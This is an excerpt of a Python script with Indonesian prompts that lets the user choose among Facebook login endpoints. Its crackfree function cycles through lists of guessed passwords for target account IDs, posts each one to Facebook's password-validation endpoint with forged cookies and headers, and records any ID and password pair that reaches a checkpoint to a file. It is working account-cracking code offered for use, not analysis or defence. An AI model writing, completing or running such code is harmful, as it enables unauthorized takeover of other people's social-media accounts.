...
def setting():
	...
	print(f'2. login from {b}touch.facebook.com{x} (Testing)')
	print(f'3. login from {b}p.facebook.com{x} (Disarankan)')
	print('')
	hc = input('└──> Pilih : ')
	if hc in ['1','01']:
...
def crackfree(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			po = ses.post('https://touch.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r ID  : {kk}{idf}{P}          \n PW  : {kk}{pw}          {P}\n User Agent  : {kk}{ua}{P}           \n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
